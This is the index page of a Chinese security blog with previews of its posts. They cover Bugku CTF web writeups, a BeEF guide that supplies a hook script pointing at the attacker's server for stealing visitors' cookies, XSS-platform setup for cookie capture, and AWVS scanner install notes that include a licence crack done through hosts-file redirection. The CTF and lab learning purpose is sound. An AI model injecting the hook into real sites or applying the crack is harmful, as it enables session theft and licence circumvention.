<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/qwe/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":10,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="ChillyBerry&#39;s Blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="ChillyBerry&#39;s Blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="jojo">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>ChillyBerry's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">ChillyBerry's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/09/bugku-web-writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/1.jpg">
      <meta itemprop="name" content="jojo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ChillyBerry's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/09/bugku-web-writeup/" class="post-title-link" itemprop="url">bugku_web_writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-12-09 16:15:35 / 修改时间：18:27:08" itemprop="dateCreated datePublished" datetime="2022-12-09T16:15:35+08:00">2022-12-09</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="post"><a href="#post" class="headerlink" title="post"></a>post</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$what</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;what&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>post框提交what&#x3D;flag</p>
<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;**********&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>?num&#x3D;1a</p>
<h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><p>右键查看源代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &amp;#<span class="number">102</span>;&amp;#<span class="number">108</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">103</span>;&amp;#<span class="number">123</span>;&amp;#<span class="number">100</span>;&amp;#<span class="number">56</span>;&amp;#<span class="number">51</span>;&amp;#<span class="number">55</span>;&amp;#<span class="number">48</span>;&amp;#<span class="number">98</span>;&amp;#<span class="number">54</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">102</span>;&amp;#<span class="number">53</span>;&amp;#<span class="number">55</span>;&amp;#<span class="number">55</span>;&amp;#<span class="number">53</span>;&amp;#<span class="number">55</span>;&amp;#<span class="number">55</span>;&amp;#<span class="number">49</span>;&amp;#<span class="number">48</span>;&amp;#<span class="number">98</span>;&amp;#<span class="number">48</span>;&amp;#<span class="number">52</span>;&amp;#<span class="number">102</span>;&amp;#<span class="number">54</span>;&amp;#<span class="number">48</span>;&amp;#<span class="number">50</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">50</span>;&amp;#<span class="number">98</span>;&amp;#<span class="number">56</span>;&amp;#<span class="number">57</span>;&amp;#<span class="number">100</span>;&amp;#<span class="number">52</span>;&amp;#<span class="number">125</span>; --&gt;&lt;/script&gt;  </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3：</span><br><span class="line">import html</span><br><span class="line"><span class="keyword">print</span> (html.<span class="title function_ invoke__">unescape</span>(<span class="string">&#x27;XX&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p><img src="/2022/12/09/bugku-web-writeup/image-20221209181056866.png" alt="image-20221209181056866"></p>
<p>连续点击几次，14.jpg那边会随机变，直到跳出flag</p>
<h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>访问shell.php，密码bp爆破是hack</p>
<h2 id="本地管理员"><a href="#本地管理员" class="headerlink" title="本地管理员"></a>本地管理员</h2><p>在request头加：X-Forwarded-For：127.0.0.1<br>使用admin&#x2F;test123登录获取flag「密码bp爆破」</p>
<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/1.jpg">
      <meta itemprop="name" content="jojo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ChillyBerry's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/" class="post-title-link" itemprop="url">某次实战考核</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-18 12:19:42" itemprop="dateCreated datePublished" datetime="2022-08-18T12:19:42+08:00">2022-08-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-08-19 13:28:55" itemprop="dateModified" datetime="2022-08-19T13:28:55+08:00">2022-08-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>已知：连接vpn访问192.163.3.56</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/10/CS%E5%92%8CMSF%E8%81%94%E5%8A%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/1.jpg">
      <meta itemprop="name" content="jojo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ChillyBerry's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/10/CS%E5%92%8CMSF%E8%81%94%E5%8A%A8/" class="post-title-link" itemprop="url">CS和MSF联动</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-10 20:54:04" itemprop="dateCreated datePublished" datetime="2022-08-10T20:54:04+08:00">2022-08-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-08-11 20:42:05" itemprop="dateModified" datetime="2022-08-11T20:42:05+08:00">2022-08-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工具</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Cobaltstrike简介：提权、凭据导出、端口转发、socket代理、office攻击、钓鱼等功能</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2022/08/10/CS%E5%92%8CMSF%E8%81%94%E5%8A%A8/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/1.jpg">
      <meta itemprop="name" content="jojo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ChillyBerry's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">xycmsV3.6-xss漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-08-03 21:01:38 / 修改时间：22:35:07" itemprop="dateCreated datePublished" datetime="2022-08-03T21:01:38+08:00">2022-08-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">漏洞利用</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="搭建xycms"><a href="#搭建xycms" class="headerlink" title="搭建xycms"></a>搭建xycms</h3><p>1、将uploads_code文件夹下的内容放至根目录</p>
<p>2、访问<a target="_blank" rel="noopener" href="http://localhost/install/%E8%BF%9B%E8%A1%8C%E5%AE%89%E8%A3%85%E3%80%8C%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7xyhcms">http://localhost/install/进行安装「默认账号xyhcms</a> 密码安装时自定义 」</p>
<p>3、安装完成后为了保证数据安全，务必删除install目录</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/03/beef%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/1.jpg">
      <meta itemprop="name" content="jojo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ChillyBerry's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/03/beef%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">beef使用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-08-03 20:37:47 / 修改时间：22:10:03" itemprop="dateCreated datePublished" datetime="2022-08-03T20:37:47+08:00">2022-08-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工具</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>扫描局域网从属机器、xss获取cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali：sudo beef-xss/找applications里的那头牛：beef start</span><br><span class="line">http://127.0.0.1:3000/ui/panel  beef/beef「默认账密可去/etc/beef-xss/config.yaml修改」</span><br></pre></td></tr></table></figure>

<p> 将该hook粘到目标源码中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hook: &lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看结果：http://127.0.0.1:3000/ui/panel</span><br></pre></td></tr></table></figure>

<p>commands：网页重定向、社工弹窗「界面可能不太真实」——&gt;execute</p>
<p>关闭beef：systemctl stop beef-xss.service</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/1.jpg">
      <meta itemprop="name" content="jojo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ChillyBerry's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">xssplatfrom、bluelotus使用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-07-29 14:33:46" itemprop="dateCreated datePublished" datetime="2022-07-29T14:33:46+08:00">2022-07-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-08-03 22:12:20" itemprop="dateModified" datetime="2022-08-03T22:12:20+08:00">2022-08-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工具</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="搭建xssplatform平台"><a href="#搭建xssplatform平台" class="headerlink" title="搭建xssplatform平台"></a>搭建xssplatform平台</h1><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/78778443/xssplatform">https://github.com/78778443/xssplatform</a></p>
<h4 id="修改数据库用户名、密码"><a href="#修改数据库用户名、密码" class="headerlink" title="修改数据库用户名、密码"></a>修改数据库用户名、密码</h4><p>git clone至小皮的WWW目录，并把里面的文件拷贝到网页根目录<br>文件内路径改为自己的源码的路径： ‘filepath’ &#x3D;&gt; ‘C:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;upload’<br>改成自己的ipcofnig： ‘urlroot’ &#x3D;&gt; ‘<a href="http://192.168.2.142:8001&#39;">http://192.168.2.142:8001&#39;</a>,<br>php版本需大于7.0</p>
<h4 id="导入数据库"><a href="#导入数据库" class="headerlink" title="导入数据库"></a>导入数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create database xssplatform;</span><br><span class="line">use xssplatform;</span><br><span class="line">source xssplatform.sql;</span><br></pre></td></tr></table></figure>

<h4 id="小皮面板-管理-伪静态"><a href="#小皮面板-管理-伪静态" class="headerlink" title="小皮面板-管理-伪静态"></a>小皮面板-管理-伪静态</h4><p>安装说明.txt中选择对应的apache页面填入</p>
<p><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803182053665.png" alt="image-20220803182053665"></p>
<h4 id="成功搭建"><a href="#成功搭建" class="headerlink" title="成功搭建"></a>成功搭建</h4><p><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803184029540.png" alt="image-20220803184029540"></p>
<h4 id="例一、获取cookie"><a href="#例一、获取cookie" class="headerlink" title="例一、获取cookie"></a>例一、获取cookie</h4><p>创建项目、选择默认模块、获取代码，平台上有附使用说明</p>
<p><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803184155659.png" alt="image-20220803184155659" style="zoom: 50%;"><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803184512232.png" alt="image-20220803184512232" style="zoom: 23%;"><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803184426621.png" alt="image-20220803184426621" style="zoom: 25%;"></p>
<h1 id="bluelotus"><a href="#bluelotus" class="headerlink" title="bluelotus"></a>bluelotus</h1><p><a target="_blank" rel="noopener" href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.2.142:8001/bluelotus/install.php">http://192.168.2.142:8001/bluelotus/install.php</a></p>
<p><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803185209974.png" alt="image-20220803185209974"></p>
<p>不用修改其他数据</p>
<p>windows环境安装失败 linux安装成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start apache2</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803202446303.png" alt="image-20220803202446303"></p>
<p>我的JS-选择模板-插入模板-新增-生成payload-生成的js代码可插入目标机源码中</p>
<p><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803203050491.png" alt="image-20220803203050491"></p>
<p><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803202642369.png" alt="image-20220803202642369"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/29/%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/1.jpg">
      <meta itemprop="name" content="jojo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ChillyBerry's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/29/%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">漏扫工具使用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-07-29 12:21:50 / 修改时间：14:11:23" itemprop="dateCreated datePublished" datetime="2022-07-29T12:21:50+08:00">2022-07-29</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工具</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="aWVS"><a href="#aWVS" class="headerlink" title="aWVS"></a>aWVS</h2><p>arl-awvs.py:联合arl灯塔进行扫描</p>
<p>用户名密码：<a href="mailto:&#x61;&#119;&#118;&#x73;&#64;&#97;&#x77;&#118;&#x73;&#x2e;&#99;&#111;&#109;">&#x61;&#119;&#118;&#x73;&#64;&#97;&#x77;&#118;&#x73;&#x2e;&#99;&#111;&#109;</a>&#x2F;<a href="mailto:&#x41;&#119;&#x76;&#115;&#64;&#x61;&#x77;&#118;&#115;&#46;&#99;&#x6f;&#x6d;">&#x41;&#119;&#x76;&#115;&#64;&#x61;&#x77;&#118;&#115;&#46;&#99;&#x6f;&#x6d;</a></p>
<h4 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker search awvs</span><br><span class="line">sudo docker pull xrsec/awvs</span><br><span class="line">docker run -it -d --name awvs -p 3445:3443 --restart=always xrsec/awvs:latest</span><br></pre></td></tr></table></figure>

<h3 id="破解步骤"><a href="#破解步骤" class="headerlink" title="破解步骤"></a>破解步骤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">复制license_info.json&amp;wa_data.dat---&gt;</span><br><span class="line">windows&gt;&gt;&gt;C:/PrpgramData/Acunetix/shared/license/</span><br><span class="line">linux&gt;&gt;&gt;/home/acunetix/.acunetix/data/license/</span><br><span class="line">mac&gt;&gt;&gt;/Applications/Acunetix.app/Contents/Resources/data/license</span><br><span class="line"></span><br><span class="line">docker&gt;&gt;&gt;docker cp license_info.json&amp;wa_data.dat---&gt; doker-id:/home/acunetix/.acunetix/data/license</span><br><span class="line"></span><br><span class="line">修改hosts文件：</span><br><span class="line">windows：C:\Windows\System32\drivers\etc</span><br><span class="line">linux:/etc/hosts</span><br><span class="line">追加：</span><br><span class="line">127.0.0.1 updates.acunetix.com</span><br><span class="line">127.0.0.1 erp.acunetix.com</span><br></pre></td></tr></table></figure>

<h2 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h2><p>针对内网资产</p>
